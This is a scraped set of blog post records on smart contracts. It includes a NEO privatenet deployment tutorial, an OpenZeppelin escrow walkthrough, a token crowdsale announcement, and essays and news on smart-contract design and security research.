Add.7. Similarly, replace the contents of protocol.json with the contents of protocol.neodocker.json.Figure 9.6. Visual Studio: protocol.jsonNOTE: If protocol.neodocker.json is not part of your project, you can download it from here(./json/protocol.neodocker.json) and place it in the C:\\NEO\\neo-gui-developer\\neo-gui folder. Right-click on the neo-gui project folder in Visual Studio and select Add > Existing Item... > *.*. Select protocol.neodocker.jsonand click Add.8. In Visual Studio, click Start to rebuild and start neo-gui. It should starting syncing with the NEO privatenet Docker container.Figure 9.7. neo-gui: Running against the NEO privatenet Docker containerNOTE: If you made the optional code change in Activity 5\u200a\u2014\u200aBuild and test NEO developer tool projects (from source), you will see the name of your NEO blockchain folder in the title bar (e.g. DockerChainTestNet).Create a new development wallet9. From the neo-gui menu bar, click Wallet > New Wallet Database....Figure 9.8. neo-gui: Wallet > New Wallet Database...10. The following New Wallet dialog but will appear. Click browse.Figure 9.9. neo-gui: New Wallet\u00a0dialog11. Select a folder where you want your wallet to be created, enter the file name for the wallet database, and click Save.Figure 9.10. neo-gui: Wallet\u00a0LocationNOTE: Think of these as temporary development wallets that you will need to recreate every time you reset the NEO privatenet Docker container. There\u2019s no need to back them up.NOTE: A good suggestion is to include the name of the blockchain database folder that appears in neo-gui title bar (assuming you made this source code change in Activity 5) in the name of your wallet file.NOTE: The neo-gui-developer project only creates wallet databases using\u00a0.db3 format files (SQLLite database files). Other versions of neo-gui use JSON files. Note the difference.12. Enter a password to protect your wallet. Confirm your password by re-entering into the second field.Figure 9.11. neo-gui: Wallet\u00a0Password13. The creation of your wallet is complete. One default account address has been created.NOTE: This address will be different every time you create a new wallet.Figure 9.12. neo-gui: Wallet\u00a0CreatedImport the existing Developer account from the NEO privatenet Docker container14. To get some NEO/Gas, there is a preconfigured Developer account configured into the NEO private Docker container. To import this account, right-click on the newly created account and select Import > Import from WIF....Figure 9.13. neo-gui: Import > Import from\u00a0WIF...15. The following Import Private Key dialog box will be displayed. Enter the WIF key provided in the NEO Docker container documentation [NEODOCKER1] and click OK.WIF key: KxDgvEKzgSBPPfuVfw67oPQBSjidEiqTHURKSDL1R7yGaGYAeYnrFigure 9.14. neo-gui: Import Private\u00a0Key16. The result should be that you\u2019ve created the following second account at address:Address: AK2nJJpJr6o664CWJKi1QRXjqeic2zRp8yNOTE: You may need to select Wallet > Rebuild Index for the non-zero NEO/Gas to appear next to the new account address.Figure 9.15. neo-gui: Second Address with\u00a0NEO/GasDeploy your smart contract (HelloWorld 1.0)Open Visual Studio 2017 to create a new NEO smart contract project.Figure 9.16. Visual Studio\u00a0201718. Select File > New > Project... to open the New Project dialog box. Select Visual C#. Select NeoContract. Click OK to close this dialog box and create a new NeoContract solution and project in Visual Studio.Figure 9.17. Visual Studio: Create a New NeoContract ProjectNOTE: If you have created previous NeoContract projects, your project may be called NeoContract2, NeoContract3, or whatever you chose to name the project. Remember the project name and path because you will need to find the AVM file later on in this activity.19. Visual Studio may take a few minutes to create the NeoContract project.Figure 9.18. Visual Studio: Creating the NeoContract Project20. Right-click on the NeoContract project folder and select Build. Note the highlighted messages in the Build section of the Output panel. These 2 message indicate the Visual Studio was able to create both the NEO virtual machine byte code file as well as the Application Binary Interace (ABI) file (in JSON format).NOTE: If you don\u2019t see these 2 messages, the most likely senarios are:neon.dll wasn't published properly. Go back to Task 6 of this activity.The Path environment variable was not set correctly. Go back to Task 16 of this activity.You had opened Visual Studio before you set the Path environment variable. Close Visual Studio and then go back to Task 20.Figure 9.19. Visual Studio: Building the NeoContract ProjectDeploy your first smart\u00a0contract21. From the neo-guimenu bar, select Advanced > Deploy Contract... to display the Deploy Contact dialog box.Figure 9.20. neo-gui: Deploy Contract Dialog\u00a0Box22. Enter the following information in the Deploy Contract dialog box.In the Information section, enter something appropriate for each field. These fields must be non-blank.In the Return Type section, leave these fields empty (for this particular smart contract).Click the Need Storage check box so that a check is displayed.Click Load to the AVM file created by your Visual Studio project (e.g. C:\\NEO\\repos\\NeoContract1\\NeoContract1\\bin\\Debug\\NeoContract1.avm).\u00a0.23. When the above information is complete, click Deploy on the Deploy Contract dialog box to complete the preparation steps for neo-gui to deploy the VM byte code for your contract.The Script Hash will be displayed in the Script Hash dialog box. Click copy to have the script hash on the clipboard.Figure 9.21. neo-gui: Script\u00a0HashNOTE: The script hash is a hash of the VM byte code read in from your AVM (.avm) byte code file. This is the same script hash value that appears at the bottom of the Deploy Contract dialog box after you had loaded your AVM file.NOTE: If you forget to click copy to save a copy of the script hash to the clipboard, you can always retrieve the script hash value by reselecting Advanced > Deploy Contract... to display the Deploy Contact dialog box and reloading your AVM file. The script hash will appear near the bottom of the Deploy Contract dialog box. If all you need is the script hash, you don't need to complete the fields in the Information or Return Type sections. Click Cancel this time instead of Deploy.NOTE: If you haven\u2019t changed the code for your smart contract (and hence, the AVM file created by Visual Studio/neon will be the same), it will have the same script hash value. neo-gui doesn't create a new script hash value every time you deploy a smart contract. It only calculates a new hash value if the code for the smart contract has changed.24. Immediately after you copy the script hash in the previous task, click close on the Script Hash dialog box to display the following Invoke Contract dailog.Click Test and then click Invoke. It is with these 2 actions that your smart contract will be deployed to the NEO privatenet.Figure 9.22. neo-gui: Invoke Contract Dialog\u00a0Box25. When the Transaction successful dialog box appears, click close. There is no need to copy of the transaction hash (TXID).Figure 9.23. neo-gui: Transaction Successful Dialog\u00a0Box26. In neo-gui, click on the Transaction History tab to see the list of transactions that have been executed on the NEO privaenet.NOTE: The first transaction is pending \u201cunconfirmed\u201d status; it has not been confirmed by the nodes on the blockchain.Figure 9.24. neo-gui: Transaction History26. You need to wait until the \u201cunconfirmed\u201d state changes to a number (e.g. 1). In this case, some time has elapsed and 3 blocks have confirmed your most recent transaction.NOTE: Then you can click on the Event Log tab to see if your smart contract has called Runtime.Notify() or Runtime.Log() to post messages to the NEO Event Log.Figure 9.24. neo-gui: Transaction HistoryInvoke your first smart\u00a0contract27. From the neo-guimenu bar, select Advanced > Invoke Contract... to display the Invoke Contact dialog box.Paste the script hash from the deployment tasks into the ScriptHash field. If you deployment was successful, the rest of the fields on the form should be filled with the values you entered on the Deploy Contract dialog box.NOTE: If the fields are blank, go back to Task 21 and start over. Pay particular attention to the instructions in Task 23.Figure 9.25. neo-gui: Invoke Contract Dialog\u00a0Box28. Click Test to invoke your contract.Figure 9.26. neo-gui: Invoke Contract Dialog Box:\u00a0Test29. The results (return values) will appear in the text box at the bottom of the dialog.NOTE: You may have to click it twice.Figure 9.27. neo-gui: Invoke Contract Dialog Box:\u00a0Results30. Returning to the neo-gui Account tab, you will notice the your NEO/Gas has been reduced.NOTE: 490 Gas is used to deploy a contract. 1 Gas is used to invoke a transaction.Figure 9.28. neo-gui Account\u00a0TabCreate your second smart contract (HelloWorld 2.0)31. Follow the pattern set out in the previous tasks to create a new NeonContract project (e.g. NeoContract2).NOTE: If you have created previous NeoContract projects, your project may be called NeoContract3, NeoContract4, or whatever you chose to name the project. Remember the project name and path because you will need to find the AVM file later on in this activity.32. Make a few changes to the default smart contract:Change Main() to a accept a single integer parameter called value.Add a return value * 100; statement to the end of Main().Figure 9.29. HelloWorld 2.0 Smart\u00a0ContractYour code should not look similar to the following:using System;using System.Numerics;using Neo.SmartContract.Framework;using Neo.SmartContract.Framework.Services.Neo;namespace NeoContract2{    public class HelloWorld : SmartContract    {        public static int Main(int value)        {            Storage.Put(Storage.CurrentContext, \"Hello\", \"World!\");            return value * 100;        }    }}Code 9.1: HelloWorld 2.0Deploy your second smart\u00a0contract33. Follow the pattern set out in the previous tasks to deploy your HelloWorld 2.0 smart contract. Fill in the fields on the Deploy Contract dialog box.NOTE: On the Deploy Contract dialog box, in the Return Type section, you need to provide a string of 2-digit codes denoting the data type of:Inbound parametersReturn valueThe data type codes for the parameters and return value can be found in the following table.9.1: NEO Smart Contract Parameter/Return Types [NEOPARMTYPES]For HelloWorld 2.0, you need to specify 02 and 02 for the single integer inbound parameter and the integer return value.Figure 9.30. HelloWorld 2.0: Deploy\u00a0Contract34. Load the AVM file for HelloWorld 2.0 and click Deploy on the Deploy Contract dialog box.Figure 9.31. HelloWorld 2.0: Load\u00a0Contract35. Copy the script hash value and click close on the Script Hash dialog box.Figure 9.32. HelloWorld 2.0: Script\u00a0Hash36. To complete the deployment, click Test and then Invoke on the Invoke Contract dialog box.Figure 9.33. HelloWorld 2.0: Complete Deployment37. Deployment complete. Click close.Figure 9.34. HelloWorld 2.0: Deployment CompleteInvoke your second smart\u00a0contract38. On the right-side of the Invoke Contract dialog box, in the Contract Parameters section, click on Integer=(null)to dislay the Parameter Editor dialog box. Enter 123 and click Add.Figure 9.35. HelloWorld 2.0: Parameters39. Click Test to call your smart contract. The results (return value) will appear in the text box at the bottom of the dialog box.Figure 9.36. HelloWorld 2.0:\u00a0Test40. To see the list of contracts you have deployed,dFrom the neo-guimenu bar, select Advanced > List Contracts to display the Smart Contract Monitor dialog box.Figure 9.37. neo-gui: Smart Contract\u00a0MonitorScript LibraryNEO Docker Download/Install/Run (./scripts/neodockerinstall.bat.txt)NEO Docker Stop/Remove (./scripts/neodockeruninstall.bat.txt)NEO Docker Start (./scripts/neodockerstart.bat.txt)NEO Docker Stop (./scripts/neodockerstop.bat.txt)NEO Docker Restart (./scripts/neodockerrestart.bat.txt)NEO Docker Reset (./scripts/neodockerreset.bat.txt)NEO Docker Python CLI/Shell (./scripts/neodockerpshell.bat.txt)References[QUICKSTART] neo-csharpcoe, NEO Blockchain Quick Start Guide for\u00a0.NET Developers from https://github.com/mwherman2000/neo-dotnetquickstart/blob/master/README.md[NEODOCKER1] metachris, metachris/neo-privnet-with-gas from [https://hub.docker.com/r/metachris/neo-privnet-with-gas/]https://hub.docker.com/r/metachris/neo-privnet-with-gas/()[NEOPARMTYPES] Neo Project, Smart Contract Parameters and Return Values from http://docs.neo.org/en-us/sc/tutorial/Parameter.htmlOther Good Resources[NEOPYTHONTUTORIAL] Nick Fujita, NEO Smart Contracts Tutorial: helloWorld (Python) from https://steemit.com/neo/@z0yo/neo-smart-contracts-tutorial-helloworld[NEOPYTHONTUTORIALVIDEO] Nick Fujita, NEO Smart Contract Tutorial\u200a\u2014\u200aHello World (Python) from https://www.youtube.com/watch?v=9Ha_5RdOQrA[NEOGUIDEVPULL38] Michael Herman. Pull Request #38 to have the config.neodocker.json and protocol.neodocker.json files added to the neo-gui-developer project from https://github.com/CityOfZion/neo-gui-developer/pull/38", "responses": ""}, {"title": "Smart Contract\u200a\u2014\u200aDeployed and Activated", "author_name": "Team Nimiq", "link": "https://medium.com/nimiq-network/token-crowdsale-smart-contract-deployed-and-activated-5c05597e79b7?source=search_post", "post_date": "Jun 26, 2017", "readtime": "2 min read", "upvotes": "12", "content": "Smart Contract\u200a\u2014\u200aDeployed and ActivatedContributions open on Ethereum Mainnet block 3'942'670\u200a\u2014\u200aWednesday June 28, ~1PM\u00a0UTCTeam NimiqBlockedUnblockFollowFollowingJun 26, 2017We are pleased to announce that the Nimiq Contribution Smart Contract is deployed and activated on the Ethereum mainnet.The contributions will open at the time that mining commences on Ethereum block 3'942'670. You can check what the latest block is on Etherscan. Based on current Ethereum block mining times, we estimate that Ethereum block 3'942'670 will be mined on or about 1:00PM UTC on Wednesday June 28, 2017.The contributions can continue until the time that 60'000 ETH have been received, 10'500'000 NET created, or mining commences on Ethereum block 4'081'130, whichever is earlier. For the avoidance of doubt, these estimates are provided for informational purposes only, and the contribution period will commence and conclude strictly according to the block based definition above.The creation rate is 175 NET for 1 ETH the first two weeks and 125 NET for 1 ETH the second two weeks.Send ETH ONLY to the Nimiq Contribution Address shared on https://nimiq.com (please agree to be bound to these Terms to view the address).We recommend sending at least 300'000 Gas with your transaction.Transaction Data Field must read: 0xb4427263Detailed instructions on how to participate are available in our previous blog post.By participating through contributions, you agree to be bound to these Terms.", "responses": ""}, {"title": "Columbia University to Support Smart Contract\u00a0R&D", "author_name": "Sadie Williamson", "link": "https://hackernoon.com/columbia-university-to-support-smart-contract-r-d-c595ec815255?source=search_post", "post_date": "Dec 19, 2018", "readtime": "3 min read", "upvotes": "18", "content": "Columbia University to Support Smart Contract\u00a0R&DSadie WilliamsonBlockedUnblockFollowFollowingDec 19, 2018Despite its incredible proliferation in the past two years, the blockchain is still a relatively novel technology, requiring continual development and maturation before it can attain the prominent role that many expect it to play in the digital age.QTUM, an open sourced public blockchain initiative, is donating $400,000 to academics at the University of Columbia who are advancing blockchain research in several ways. The grant is being extended to Ronghui Gu, Columbia University\u2019s assistant CS professor who will oversee blockchain research being conducted by post-doctorate and Ph.D. students.As it relates to its original purpose, facilitating cryptocurrency transactions, the blockchain has made incredible cultural inroads, inspiring hundreds of token projects and facilitating the global expansion of digital currencies. At the same time, enterprise adoption is accelerating as companies including IBM and Microsoft make considerable investments in the technology.Blockchain Expansion in University LapsIn many ways, this growth is facilitated by the work happening at universities around the world. For example, the blockchain lab at the Massachusetts Institute of Technology is one of the oldest and most prolific in the world, attracting a global cohort of blockchain developers. Other significant universities including Cornell, Duke, Georgetown, Princeton, and Stanford have each established an academic programs dedicated to blockchain technology.Moreover, as Bitcoin Magazine notes, \u201cuniversity-led blockchain research and development initiatives are on the rise, as teams of professors, blockchain developers and students work to take the industry from market speculation to mainstream application.\u201dThe new program is researching DeepSEA, a programming language intended to bridge the gap between high-level formal reasoning and low-level systems programming in mainstream programming initiatives.Perhaps most importantly, this research is intended to combine gains in DeepSEA with Ethereum\u2019s prominent smart contracts, improving the security and functionality of one of the most fundamental components of the decentralized ecosystem.As the 2016 DAO debacle demonstrates, smart contract security is mandatory for decentralized organizations to flourish. In the case of DAO, flaws in the smart contract code enabled a user steal $50 million in Ether, functionally ending one of the most ambitious and renowned crypto projects to date.Since smart contracts are written in relatively low-level code and verification methods require high-level development, DeepSEA is intended to be the innovative next step the secures smart contracts. QTUM is putting their money behind DeepSEA, believing it will make these contracts secure and enabling the decentralized economy to expand with confidence.Big Gains for Broad\u00a0AdoptionWhen it comes to mainstream blockchain adoption, smart contracts are one of the most sought after components of the technology. Functioning as a digital escrow service, smart contracts enable the automatic transfer of data, payments, or other transitory mediums, and they have obvious implications today\u2019s digital ecosystem.QTUM\u2019s investment in Columbia University\u2019s research efforts is reminiscent of a broad trend in the blockchain industry. Big projects like Ripple are investing heavily in blockchain research and academics. Since the technology is so new and the number of experts are relatively scarce, investing in this research initiatives both advances blockchain\u2019s maturity while solving problems that blockchain projects cannot fix themselves.By targeting blockchain\u2019s usability and smart contract adoption, QTUM\u2019s investment could return big gains for blockchain technology in general and for their platform specifically.", "responses": ""}, {"title": "", "author_name": "James Martin Duffy", "link": "https://medium.com/@jamesmartinduffy/if-you-look-at-the-contract-on-etherscan-under-the-read-smart-contract-tab-you-can-see-the-a6b946d7a280?source=search_post", "post_date": "Dec 4, 2017", "readtime": "", "upvotes": "17", "content": "James Martin DuffyBlockedUnblockFollowFollowingDec 4, 2017If you look at the contract on EtherScan under the \u201cRead Smart Contract\u201d tab, you can see the external contract addresses it points to (as well as the addresses for the CEO, COO, etc.).From there you can find the geneScience contract. Because they didn\u2019t verify their contract code on Etherscan by uploading the source, it\u2019s unverified. But as Christoph Michel said in his response, you could decompile the EVM code. Here\u2019s a stackoverflow topic on that if you\u2019re interested.", "responses": ""}, {"title": "Open-Zeppelin Escrow smart\u00a0contract", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/open-zeppelin-escrow-smart-contract-2a54ad027482?source=search_post", "post_date": "Oct 30, 2018", "readtime": "3 min read", "upvotes": "79", "content": "Open-Zeppelin Escrow smart\u00a0contractEscrow smart contract open-zeppelin 2.0Gaurav AgrawalBlockedUnblockFollowFollowingOct 30, 2018SourceToday, we will look in smart contract escrow and understand open-zeppelin escrow smart contract.What is\u00a0escrow?An escrow is a financial arrangement where a third party holds and regulates the payment of the funds required for two parties involved in a given transaction. Escrow is used by businesses as a trusted party for a financial agreement. There are many online escrow services, we can also build an escrow service using smart contract.Open zeppelin Escrow Contract-Permission manager Smart contract (Secondary.sol)Before diving into open-zeppelin escrow smart contract, we will first look at Secondary.sol which is also provided by open-zeppelin. It\u2019s essentially a permission manager wrapper which gets used in Escrow.sol.Why Secondary.sol?Secondary.sol will help in establishing a primary party for our contract. This primary party is us (Escrow service). This defines modifier which will be used to enforce ownership while interacting with our escrow system. Of course, we can build this functionality in escrow smart contract itself but creating Secondary.sol helps us in reusability, modularity and separation of concerns.Here is code for the Secondary.sol.Now, Let\u2019s look at this contract.Constructor- Account which deploys this contract on blockchain will be the _primary (Primary party) for this smart contract and will control this contract.Modifier- There is a modifier if used in any function will check that function is getting called by the primary party or not.Transfer ownership- of course there is a function to change the primary party.Escrow Smart\u00a0contractBecause we are providing escrow service. We will control funds in our escrow(We will be the primary party in Secondary.sol), we will deposit and withdraw for a party and keep tracks of deposits. Anyone can check how much amount is deposited to a corresponding address for a given address.That\u2019s it now we can dive into our Escrow smart contract. So now let's understand Escrow.sol.We are defining a mapping to track the deposits. It maps address with deposit values in escrow contract.mapping(address => uint256) private _deposits;Events- Smart contract also defines two events, One for deposits and one for withdraws.event Deposited(address indexed payee, uint256 weiAmount);event Withdrawn(address indexed payee, uint256 weiAmount);Methods- now let\u2019s see our methods in escrow smart contract.deposit\u200a\u2014\u200aThis is a simple method which only allows contract owner(primary party) to submit a deposit for any party. Look we have used onlyPrimary modifier from Secondary.sol for this permission management. We are also storing the address of the party for whom we deposit the ether. We are also emitting deposited at the end.function deposit(address payee) public onlyPrimary payable {    uint256 amount = msg.value;    _deposits[payee] = _deposits[payee].add(amount);          emit Deposited(payee, amount);  }withdraw\u200a\u2014\u200aWe will use this method to transfer the ether back to the party for whom we deposit the ether. We will update our mapping and emit an event in case of a successful transaction. Here also we are using onlyPrimary to make sure that only we can perform withdraw.function withdraw(address payee) public onlyPrimary {    uint256 payment = _deposits[payee];    _deposits[payee] = 0;    payee.transfer(payment);    emit Withdrawn(payee, payment);  }depositsOf\u200a\u2014\u200aThis is a function which returns deposited value for a given address and it\u2019s a public, so anyone can check the escrow balance for a given account.function depositsOf(address payee) public view returns (uint256) {    return _deposits[payee];}That\u2019s it, our smart contract is complete. We can add extra functionality on top of it and also it\u2019s well tested but you can test it just for getting an idea that how things are working. We will look at other 2 escrow contracts (Conditional Escrow and RefundEscrow)provided by open-zeppelin library in next tutorials which are built upon this Escrow smart contract.If you don\u2019t understand anything or learn anything about smart contracts, you can comment below. And if you find this useful you can \ud83d\udc4f and follow me on medium.", "responses": ""}, {"title": "NEO Blockchain Coding Day\u200a\u2014\u200aCode Smart Contract with\u00a0Python", "author_name": "NEO", "link": "https://medium.com/@NEO_Council/neo-blockchain-coding-day-code-smart-contract-with-python-3bd22830bfa5?source=search_post", "post_date": "May 15, 2018", "readtime": "2 min read", "upvotes": "9", "content": "NEO Blockchain Coding Day\u200a\u2014\u200aCode Smart Contract with\u00a0PythonNEOBlockedUnblockFollowFollowingMay 15, 2018Event:Theme: NEO Blockchain Coding Day\u200a\u2014\u200aCode Smart Contract with PythonTime: May 26, 2018 13:00\u201318:30Venue: F1, Innospace+, \u211677, Zhengxue Road, Yangpu District, ShanghaiParticipants: NEO technophiles, blockchain technophiles, Python developers and other developersForm: Workshop, a chance for developers to gain hands-on experienceTips for preparation:Signed-up developers are required to bring their own laptops with Mac OS or Linux systems preferably, or windows as long as a Linux VM is installed;Signed-up developers are advised to register a Github account beforehand;Participants may need to configure their software programming environment beforehand to leave enough time for other arrangements of the coding day. Reference docs for configuration: https://github.com/CityOfZion/python-smart-contract-workshopSchedule:13\uff1a00\u201313\uff1a30 Check-in (30 min)13\uff1a30\u201315\uff1a00 Training (90min) Keynote speaker: Peter Lin NEO R&D DirectorTraining contents:Learning resources and websites sharingAn introduction to the system and environment configurationDocker set-upSmart contract case studyCheck_library supportApply smart contract to field registration15:00\u201315:15 Break15:15\u201318:30 Coding practice (breaks)convenor:Peter LinNEO Global Development (NGD) R&D DirectorAn early developer at NEO for blockchain app development on public chain and consortium chain.Luo XueNEO Community DeveloperSoftware engineering, Tongji UniversityFinancial technology, Peking UniversityBlockchain community contributorJonathan LimNEO Community DeveloperNanyang Technological University, SingaporeBlockchain community contributor", "responses": ""}, {"title": "A Smart Contract Development Stack, Part II: Game Theoretical Aspects", "author_name": "Markus Voelter", "link": "https://languageengineering.io/a-smart-contract-development-stack-part-ii-game-theoretical-aspects-ca7a9d2e548d?source=search_post", "post_date": "Dec 13, 2017", "readtime": "7 min read", "upvotes": "38", "content": "A Smart Contract Development Stack, Part II: Game Theoretical AspectsMarkus VoelterBlockedUnblockFollowFollowingDec 13, 2017Game theory is \u201cthe study of mathematical models of conflict and cooperation between intelligent rational decision-makers\u201d [Wikipedia]. In particular, it looks at how rules in cooperative processes (\u201cgames\u201d) impact the outcome, and also how the parties taking part in the game can cheat, i.e., exploit the rules for their own benefit.In my previous post I sketched some ideas of how smart contracts can be expressed declaratively to avoid low-level mistakes, and also emphasised that techniques from functional safety, such as model checking, can be used to ensure properties of (state-based) contracts. However, as Bj\u00f6rn Engelmann pointed out to me, many (smart) contracts are, by definition, cooperative processes, which is why they are susceptible to \u201cgame-theoretical\u201d exploits. In this post I will mention a few, and show some ideas how they can be remedied.A First Example: Sybil\u00a0AttacksA sybil attack is one where a reputation-based system is subverted by one (real-world) party creating loads of fake (logical) identities who then behave in accordance with the real world party\u2019s goals. For example, consider a decision that is based on majority vote. An attacker could create lots of additional parties and thereby taking over the majority, leading to a decision in the interest of the attacker. This attack only works, of course, if it is at all possible to include additional parties in the set of decision makers, but this kind of dynamic group is certainly not rare. So what can be done to prevent it?Vote inOne thing that can be done is to require that new parties cannot just join, but have to be voted in by the existing members. It would then be there task to ensure, through means outside the contract, that a join request is valid in the sense that is does not original from a malicious real-world entity. The last example in my previous post showed this process. However, ensuring this validity can be a lot of effort, risking that it isn\u2019t done consistently. It can also be exploited by the existing decision makers to keep unwanted additional parties out, reducing the openness of the overall process (if that openness is required in the first place).Rate LimitationsAnother approach to reducing the risk from Sybil attacks is to limit the rate at which new parties can request to join the process. To implement this declaratively, I have implemented a facility by which the rate of commands that come into an interactor (read: the events that come into a state machine) can be limited. The following code expresses that while the machine is in state requesting, only three commands per second are allowed (obviously a value that is useful only for testing). If more requests come in, they are rejected.The Interceptor FrameworkThe rate keyword shown above is an example of an interceptor. Interceptors are associated with a state (or with a parent state in a hierarchical state machine). Every trigger or variable access that enters the machine is first passed to all applicable interceptors (they are collected by walking up the state hierarchy). The interceptor can observe the command or variable access and decide what to do about it:It can let the request through unchanged,It can make arbitrary changes to the request,Or it can block the request completely.In the example above, the request is completely blocked if the frequency of requests exceeds the one specified in the rate interceptor. Note that interceptors are different from guard conditions because they apply, hierarchically, to all transitions in a state, and they can also maintain their own state\u00a0. The rate interceptor maintains a counter of the number of requests in the given timespan to decide about rejection.Interceptors are a bit similar to Solidity\u2019s Function Modifiers, although interceptors are associated with states and not single functions.I have implemented several other interceptors that can all be used to help with the game theoretical nature of smart contracts. More examples follow below, after we have introduced context arguments.Context ArgumentsA command entering an interactor (e.g., a triggering event entering a statemachine) can have arguments. For example, when triggering a buy event, that event may carry the price the client may want to pay for whatever they buy. Guard conditions can take the arguments into account.In addition, I have extended interactors to support context arguments. They are essentially a second list of arguments that are different from the regular arguments in the following way:They are optional in the sense that an interceptor decides whether they are required or not for a given commandFor the client, special syntax exists to supply values for the arguments without explicitly mentioning it for each command.For (Ethereum-style) smart contracts, an obvious context argument is the sender of a message; this allows the contract to make decisions about the validity of a command and also to ensure that the sender\u2019s account pays the transaction fees.We are now ready to look at the next interceptor.The SenderIs interceptorIt is rather obvious that, for contracts to be valid, one often has to check that commands come from a limited set of parties. To continue with the example above, only the set of already-voted-in decision makers can take part in a vote. The following code enforces this by using the senderIs interceptor:This interceptor takes as an argument a collection of parties, and for every command or variable read that comes in, it checks that the sender is in the list of parties (players in the example above). If it isn\u2019t, the request fails. It also fails if no sender context argument is supplied by the client at all.Note how within a state that (transitively) has a senderIs interceptor, a variable sender is available that refers to whoever sent this command; interceptors that enforce (by otherwise failing) that a given context argument is specified can also make available special variables with which that context argument can be accessed to make further decisions in the implementation. In the example above, the sender variable is passed into a multi-party boolean decision (as explained in the previous post) that handles the actual decision of whether the requesting sender should be allowed in.Obviously, one could perform the validation of the sender manually in every guard condition of every transition; but as you can tell from the words \u201cmanually\u201d and \u201cevery\u201d, this is tedious and error prone, and should thus be avoided.Turn-by-Turn GamesMany \u201cgames\u201d require a fair allocation of opportunities to participating parties. One way of achieving this is to run a game turn-by-turn, where each party can make one \u201cmove\u201d in every \u201cround\u201d. In my example, I have a bidding process:Note how the bidding state uses a takeTurns interceptor. Again, it takes as an argument a list of parties which have to take turns. You can configure how strict the turn-by-turn policy should be enforced. Unordered means that in each round, everybody has to make a move, but the order is not relevant. Ordered means that the order given my the list of parties passed to the interceptor is strictly enforced. A violation leads to a failure of the command. The interceptor also provides access to the list of allowed next movers; this could potentially be used to notify parties that it\u2019s their turn.Now, there is a risk of a denial of service attack: assume ordered mode, and the next party P just doesn\u2019t make its move: the whole process is stuck. Nobody else can make a move because it\u2019s P\u2019s turn. But P just doesn\u2019t do anything. This is why a turn-by-turn game should always include a timeout:In the refined example above, we specify a timeout of 500. If the next party does not make their move within 500 time units after the previous one, that party is removed from the game. It then becomes the another party\u2019s turn. It\u2019s also possible to just skip the \u201csleeping\u201d party and give the turn to the next one in line. Further policies can be imagined, such as skip three times and then remove, or whatever.SummaryWhen I chatted with Bj\u00f6rn about safety of smart contracts and mentioned model checking, he said that he doesn\u2019t know how to do model checking for game-theoretical properties. Obviously I don\u2019t know either. But instead of checking, another way to reduce the risks is to support correctness-by-construction, i.e., make it very simple to define contracts that do not have a particular class of risks, for example by providing declarative means for things like authorisation, rate limiting or turn-by-turn games. This is what I have shown in this post.It should also become more and more obvious why higher-level abstractions (compared to a \u201cnormal\u201d programming language) are needed to efficiently express safe smart contracts. Trying to implement all of these things \u201cwith normal code\u201d or just with libraries will lead to many low-level mistakes. DSLs are really very useful here.", "responses": ""}, {"title": "Etherparty AMA\u00a0Summary", "author_name": "Etherparty Smart Contracts, Inc.", "link": "https://blog.etherparty.com/ama-summary-62a8d6e57e95?source=search_post", "post_date": "Apr 26, 2018", "readtime": "4 min read", "upvotes": "138", "content": "Etherparty AMA\u00a0SummaryEtherparty\u2019s VP of Product Erynn Tomlinson, Creative Director Brandon Kostinuk, and Head Designer Nick Foster sat down with Customer Experience Manager Kaegan Donnelly to answer community questions on Wednesday, April\u00a025.Etherparty Smart Contracts, Inc.BlockedUnblockFollowFollowingApr 26, 2018You can watch the whole thing on YouTube or read on to get an overview.Video whiz Max Tkacz making sure everyone looks and sounds\u00a0great.Will Rocket be launching more than three crowdfunds?Absolutely! The three you see on our website are just the beginning. We will also be announcing the winners of the #ThreeForFree contest on May 30. These winners will receive a free crowdfunding package. We have many other companies in the pipeline as well and we expect even more once Rocket launches.How much will it cost to run a crowdfund on Rocket?A crowdfund launch will cost $100,000. We have some additional discounts and incentives planned, so stay tuned!Are you planning to be listed on other exchanges?As FUEL is in its current standing a utility token, we don\u2019t engage in having it listed on any exchanges.Could you demonstrate some mockups?Absolutely we can! \ud83d\udc47Left: Rocket landing page. Right: Payment screen for\u00a0Rocket.Left: Crowdfund configuration screen. Right: Featured crowdfund page.Do you plan to launch an affiliate program?Yes! This is still in the early stages, but we are looking at ways to reward community members for referring crowdfunds to Rocket.When are you going to start mass promotion and what marketing channels are in the plan?We are conducting small scale tests to determine the best channels to use. While mass promotion, or interruption marketing, can be an effective tactic, we first need to gauge product market fit to better understand the best channels to market and communicate through before expending resources to the widest range of distribution.We will certainly be focusing in on the most commonly accessed channels for the crypto-space, Reddit and Telegram to name two, however we are duly exploring other channels we think we can find our target users in.Will Rocket be available internationally?Yes! So long as your jurisdiction allows it, Rocket will be available for use. We will also localize Rocket in additional languages such as Chinese and Korean.Will you be announcing the new name change the same time that you announce the winner of the re-branding contest?Not quite! The response to the re-brand contest was unprecedented and gave us all sorts of warm fuzzies. We received over 1,200 name submissions. It has taken us longer than expected to go through these names and secure the necessary domain names, trademarks, social media accounts, and so on. We also want to prepare some accompanying marketing materials with the new name.But we want to thank the community for their submissions with an extra bonus. We\u2019re sending 250 FUEL to a few community members whose names we loved, but felt weren\u2019t right for us. Some of our favorites include Affinity, Aura, Catalyst, Handshake, Ignition, Nebula, Nucleous, Orbit, Spark and Xpedite.Stay plugged in to find out the winner of the 10,000 FUEL!We\u2019ve seen Hero and Saturn as next products in line, where will the main focus be after Rocket releases?We have small teams already working on both Hero and Saturn. The user research team in particular is conducting studies into the needs and pain-points of these use cases. Stay tuned for more announcements related to these two upcoming product launches.Will smart contracts created by Rocket be executed on your own blockchain or on Ethereum?At launch smart contracts can be created for execution on Ethereum\u2019s or Bitcoin\u2019s blockchain (via Rootstock).From left to right, Kaegan Donnelly, Brandon Kostinuk, Erynn Tomlinson.Thanks to those who joined us on Friday! Feel free to join the conversation on our Twitter, Facebook and Reddit channels! And continue to look out for updates, announcements, as well as interesting and informative blogs on our Medium page, as well as on our official site, etherparty.com.", "responses": ""}, {"title": "", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/@merunasgrincalaitis/although-its-true-that-some-poeple-charge-too-much-for-an-ico-smart-contract-the-price-depends-on-635f0cd76566?source=search_post", "post_date": "Nov 23, 2017", "readtime": "", "upvotes": "11", "content": "Merunas GrincalaitisBlockedUnblockFollowFollowingNov 23, 2017Although it\u2019s true that some poeple charge too much for an ICO Smart Contract, the price depends on the developer that you hire. It\u2019s not the same to hire a famous one that worked for several ICOs and has lots of experience developing secure code that a developer who\u2019s new to the game.I believe 200 per hour is a bit too high, a normal price would be 100 or even 70 per hour although I\u2019m making estimates to exceed the minimum amounts just in case the code is not good.I\u2019ve seen lots of developers charging less 